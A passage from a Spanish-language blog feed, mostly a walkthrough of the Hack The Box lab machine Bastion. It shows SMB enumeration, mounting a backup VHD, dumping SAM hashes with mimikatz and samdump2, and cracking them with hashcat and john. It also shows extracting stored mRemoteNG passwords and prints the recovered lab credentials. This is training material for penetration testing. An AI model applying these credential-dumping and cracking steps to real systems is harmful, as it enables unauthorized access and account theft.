class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Vista SP1 - SP2,
Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; SP2, or Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; conditions non-ideal&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops
Service Info: OSs: Windows, Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 - 2012&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: -39m52s, deviation: 1h09m14s, median: 5s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: Bastion
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: BASTION&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Workgroup: WORKGROUP&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2019-05-07T20:00:16+02:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: guest
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-05-07 19:00:12
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-05-07 10:50:40

TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using port 135/tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   123.61 ms 10.10.14.1
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   123.96 ms 10.10.10.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 82.98 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Escaneo de sharenames en SMB con smbclient.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/bastion# smbclient -L &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.134
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; workgroup listing.
do_connect: Connection to 10.10.10.134 failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Error NT_STATUS_RESOURCE_NAME_NOT_FOUND&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;smb---backups&#34;&gt;SMB - Backups&lt;/h3&gt;
&lt;p&gt;Encontramos una nota &lt;code&gt;(note.txt)&lt;/code&gt; en el sharename de Backups, esta nos habla de un backup.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2011.21.55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;note.txt&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2011.22.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos una carpeta de un backup de la maquina en &lt;code&gt;\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\&lt;/code&gt; dentro encontramos varios archivos xml y archivo vhd.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2017.10.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;smb---montar-archivo-vhd&#34;&gt;SMB - Montar archivo VHD&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://serverfault.com/questions/566892/mount-vhd-stored-on-ext3-nas-in-windows-7-without-copying-to-ntfs-disk-is-this&#34;&gt;&lt;strong&gt;Mount VHD stored&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Para poder ver lo que contiene el archivo backup en SMB montamos el SHARENAME localmente para luego hacer lo mismo con el backup y poder ver los archivos en su interior. Para ello utilizamos una maquina Windows.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Comandos:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;net use h: &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.134&lt;span class=&#34;se&#34;&gt;\B&lt;/span&gt;ackups
DISKPART
SELECT VDISK &lt;span class=&#34;nv&#34;&gt;FILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;H:\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&amp;#34;&lt;/span&gt;
ATTACH VDISK
ASSIGN &lt;span class=&#34;nv&#34;&gt;LETTER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;E
&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
dir e:
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2017.29.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2017.30.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;sam---password-hash&#34;&gt;SAM - PASSWORD [HASH]&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos acceso al backup de la maquina podemos buscar contraseñas guardadas, existen diferentes lugares y archivos donde podemos encontrar contraseñas almacenadas (&lt;a href=&#34;https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&amp;amp;ithint=file%2cxlsx&amp;amp;authkey=!ACGFg7R-U5xkTh4&#34;&gt;&lt;strong&gt;Password Stored&lt;/strong&gt;&lt;/a&gt;), en esta maquina las encontramos en  &lt;code&gt;C:\Windows\System32\config\&lt;/code&gt;, donde podemos ver dos archivos uno llamado &lt;code&gt;SAM&lt;/code&gt; y otro &lt;code&gt;SYSTEM&lt;/code&gt; los cuales contienen hashes de autenticacion almacenadas por &lt;code&gt;SAM (Security Account Manager)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2017.44.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener los hash podemos utilizar &lt;code&gt;mimikatz&lt;/code&gt; y &lt;code&gt;samdump2&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;mimikatz - lsadump::sam
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2017.46.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;samdump2---system-sam&#34;&gt;samdump2 - SYSTEM SAM&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2017.46.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos los hash para ver los permisos del usuario &lt;code&gt;L4mpje&lt;/code&gt; en los SHARENAMES.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2017.54.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;crack-hash---hashcat-john&#34;&gt;Crack HASH - hashcat, john&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hashcat/hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; bastion.txt rockyou.txt -o bastion_pass.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;john --format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NT-old --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Cracked:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;26112010952d963c8dc4217daec986d9:bureaulampje&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell-ssh---l4mpje&#34;&gt;SHELL SSH - L4mpje&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos la contraseña para el usuario L4ampje podemos logearnos en el servicio ssh.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-07%2018.47.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra bandera &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation---nremoteng&#34;&gt;PRIVILEGE ESCALATION - nRemoteNG&lt;/h2&gt;
&lt;p&gt;Al enumerar los programas nos encontramos con uno no muy comun en maquinas windows &lt;code&gt;mRemoteNG&lt;/code&gt;.&lt;br /&gt;
![image](/images/posts/htb/bastion/Screenshot from 2019-05-08 00.35.33.webp)&lt;/p&gt;
&lt;p&gt;Al investigar un poco sobre este programa y sus vulnerabilidades encontramos que los archivos de configuracion contienen contraseñas encriptadas y las cuales pueden ser facilmente desencriptadas (&lt;a href=&#34;http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html&#34;&gt;&lt;strong&gt;Stealing Password from mremote&lt;/strong&gt;&lt;/a&gt;). Lastimosamente es una vulnerabilidad que no afecta a esta version del programa.&lt;/p&gt;
&lt;p&gt;Archivos de configuracion &lt;code&gt;(c:\Users\L4mpje\AppData\Roaming\mRemoteNG)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2000.38.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;mRemoteNG&lt;/code&gt; para ver el fuincionamiento de los archivos de configuracion. Para ello creamos un nuevo archivo de configuracion agregamos las credenciales del usuario &lt;code&gt;L4mpje&lt;/code&gt; y utilizamos la opcion de &lt;code&gt;SSH2&lt;/code&gt;, como vemos nos pudimos conectar exitosamente mediante ssh con el programa.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.28.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al guardar el archivo de conexion vemos que es un archivo XML, dicho archivo tiene la misma estructura del archivo de configuracion que tiene la maquina en &lt;code&gt;AppData&lt;/code&gt;. Eliminamos la conexion de la lista de conexiones en mRemoteNG e importamos nuevamente el archivo que habiamos guardado (&lt;code&gt;Bastion_file.xml&lt;/code&gt;), al cargarse este archivo se cargaron las credenciales y la configuracion de SSH2 anteriormente realizadas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.36.07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Estructura del archivo XML&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.48.50.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que sabemos que podemos importar un archivo de configuracion, vamos a intentar impoartar el archivo de configuracion que esta en la maquina, para ello lo descargamos. Vemos la misma configuracion que tiene nuestro archivo que guardamos anteriormente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.41.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Importamos el archivo al programa y nos muestra dos conexiones una del usuario Administrador y de L4mpje.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conexion DC&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.52.29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conexion L4mpje-PC&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.53.07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Como podemos ver las direcciones IP a las que estan configuradas esas conexiones son locales vamos a cambiarlas y dirigirlas a la IP de la maquina (10.10.10.134), de la misma forma para el SSH e intentamos conectarnos.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;L4mpje&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.55.45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;administrator---shell&#34;&gt;Administrator - Shell&lt;/h4&gt;
&lt;p&gt;Finalmente obtenemos una shell como Administrador y nuestra bandera &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2001.56.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al investigar acerca del crackeo de Contraseñas, encontre un post &lt;a href=&#34;http://www.kayhankayihan.com/mremote-password-hash-crack/&#34;&gt;&lt;strong&gt;mRemote Crack Password&lt;/strong&gt;&lt;/a&gt; en el cual muestra que podemos sacar la contraseña de cualquier conexion o configuracion de conexion mediante la creacion de una Herramienta externa con los siguientes datos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;File Name : cmd
Arguments : /k &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; %password%
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Screenshot%20from%202019-05-08%2002.00.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para extraer la contraseña seleccionamos la conexion y le damos a ejecutar &lt;code&gt;Herramienta externa &amp;gt; Seleccionamos la que hemos creado&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/Peek%202019-05-08%2002-03.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Asi es como obtenemos la contraseña de &lt;code&gt;Administrator&lt;/code&gt; y &lt;code&gt;L4mpje&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;Administrator:thXLHM96BeKL0ER2
L4mpje:bureaulampje
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/bastion/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/bastion/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Blue</title>
        <link>https://sckull.github.io/posts/blue-thm/</link>
        <pubDate>Thu, 05 Sep 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 05 Sep 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/blue-thm/</guid>
        <description>Blue es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Blue es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/blue/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Blue&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Room&lt;/td&gt;
&lt;td&gt;Blue&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Deploy &amp;amp; hack into a Windows machine, leveraging common misconfigurations issues.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RoomCode&lt;/td&gt;
&lt;td&gt;blue&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3850&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Relativamente Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DarkStar7471&#34;&gt;DarkStar7471&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos udp/tcp y sus servicios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
